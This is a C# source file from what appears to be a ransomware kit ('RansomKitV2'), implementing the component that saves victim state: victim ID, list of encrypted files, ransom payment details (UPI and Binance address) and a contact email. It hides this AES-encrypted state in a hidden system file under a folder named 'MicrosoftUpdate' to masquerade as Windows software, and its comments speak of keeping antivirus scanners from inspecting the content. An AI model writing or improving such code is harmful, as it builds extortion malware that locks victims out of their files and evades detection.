using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace RansomKitV2
{
    // ── Persisted application state ───────────────────────────────
    class AppState
    {
        public string VictimId { get; set; } = "";
        public string MasterKeyHash { get; set; } = "";
        public List<string> EncryptedFiles { get; set; } = new();
        public string UpiId { get; set; } = "";
        public string UpiAmount { get; set; } = "";
        public string BinanceAddress { get; set; } = "";
        public string ContactEmail { get; set; } = "";
        public long EncryptedAt { get; set; }
    }

    // ── State file manager ────────────────────────────────────────
    // State is AES-256-CBC encrypted, then Base64-encoded as a text
    // file so that binary scanning tools / build runners never
    // misinterpret the content.  Old raw-binary state files are
    // handled transparently via the backward-compat fallback in Load().
    static class StateManager
    {
        // 32-byte AES key
        static readonly byte[] _sk = {
            0x57,0x69,0x6E,0x44,0x65,0x66,0x53,0x76,
            0x63,0x4B,0x65,0x79,0x32,0x30,0x32,0x34,
            0x21,0x40,0x23,0x24,0x25,0x5E,0x26,0x2A,
            0x28,0x29,0x5F,0x2B,0x51,0x52,0x53,0x54
        };

        // 16-byte IV
        static readonly byte[] _iv = {
            0x52,0x4B,0x56,0x32,0x49,0x56,0x32,0x30,
            0x32,0x34,0x21,0x40,0x23,0x24,0x25,0x5E
        };

        static string StateDir => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "MicrosoftUpdate");

        static string StatePath => Path.Combine(StateDir, "svc_conf.dat");

        // ── Public API ────────────────────────────────────────────

        public static bool StateExists() => File.Exists(StatePath);

        public static void Save(AppState s)
        {
            Directory.CreateDirectory(StateDir);

            try
            {
                var di = new DirectoryInfo(StateDir);
                di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            }
            catch { }

            string json = JsonSerializer.Serialize(s);
            byte[] plain = Encoding.UTF8.GetBytes(json);
            byte[] enc = AesCbc(plain, _sk, _iv, true);

            // ── NEW: store as Base64 text so the file is never raw binary ──
            // This prevents build runners / AV scanners from choking on the
            // binary content and eliminates the FormatException when Load()
            // calls Convert.FromBase64String on a file that was written by
            // a different Save() implementation.
            string b64 = Convert.ToBase64String(enc);
            File.WriteAllText(StatePath, b64, Encoding.ASCII);

            try
            {
                File.SetAttributes(StatePath,
                    FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
            }
            catch { }
        }

        public static AppState? Load()
        {
            try
            {
                byte[] enc = ReadStateBytes();          // handles both formats
                byte[] plain = AesCbc(enc, _sk, _iv, false);
                string json = Encoding.UTF8.GetString(plain);
                return JsonSerializer.Deserialize<AppState>(json);
            }
            catch { return null; }
        }

        // ── NEW: format-agnostic reader ───────────────────────────
        // Tries Base64 text first (current format).
        // Falls back to raw binary (old format) so existing state files
        // written by the previous WriteAllBytes Save() still load cleanly.
        static byte[] ReadStateBytes()
        {
            // Read the file as ASCII text first
            string text = File.ReadAllText(StatePath, Encoding.ASCII).Trim();

            // Fast check: Base64 alphabet + optional trailing '=' padding
            // A raw-binary file will almost certainly contain bytes outside
            // [A-Za-z0-9+/=], so this reliably distinguishes the two.
            bool looksLikeBase64 =
                text.Length > 0 &&
                text.Length % 4 == 0 &&
                IsValidBase64(text);

            if (looksLikeBase64)
                return Convert.FromBase64String(text);   // new format

            // Backward compat: file is raw binary from old WriteAllBytes Save()
            return File.ReadAllBytes(StatePath);
        }

        static bool IsValidBase64(string s)
        {
            // Check every character is in the standard Base64 alphabet.
            // Intentionally strict — rejects URL-safe (-/_) variants so
            // we don't accidentally accept arbitrary text.
            foreach (char c in s)
            {
                if (!((c >= 'A' && c <= 'Z') ||
                      (c >= 'a' && c <= 'z') ||
                      (c >= '0' && c <= '9') ||
                       c == '+' || c == '/' || c == '='))
                    return false;
            }
            return true;
        }

        public static void Delete()
        {
            try
            {
                if (File.Exists(StatePath))
                {
                    File.SetAttributes(StatePath, FileAttributes.Normal);
                    File.Delete(StatePath);
                }
            }
            catch { }
        }

        // ── Internal AES helper ───────────────────────────────────
        static byte[] AesCbc(byte[] data, byte[] key, byte[] iv, bool enc)
        {
            using var aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var ms = new MemoryStream();
            using var cs = new CryptoStream(
                ms,
                enc ? aes.CreateEncryptor() : aes.CreateDecryptor(),
                CryptoStreamMode.Write);

            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }
    }
}